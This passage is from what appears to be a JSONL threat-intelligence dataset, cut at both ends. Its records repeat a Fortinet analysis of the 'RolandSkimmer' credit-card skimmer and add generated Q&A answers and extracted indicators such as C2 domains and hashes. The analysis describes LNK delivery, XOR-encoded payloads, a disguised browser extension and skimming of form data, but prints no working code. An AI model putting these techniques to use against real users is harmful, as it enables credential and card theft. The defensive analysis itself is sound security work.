SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server with specific parameters in the URL, including the site, data, and credit card number.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "banking trojan", "analysis", "botnet", "threat", "browser", "phishing", "malicious", "intelligence", "apt"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "banking trojan", "bank", "threat", "apt", "phishing", "botnet", "malicious", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly 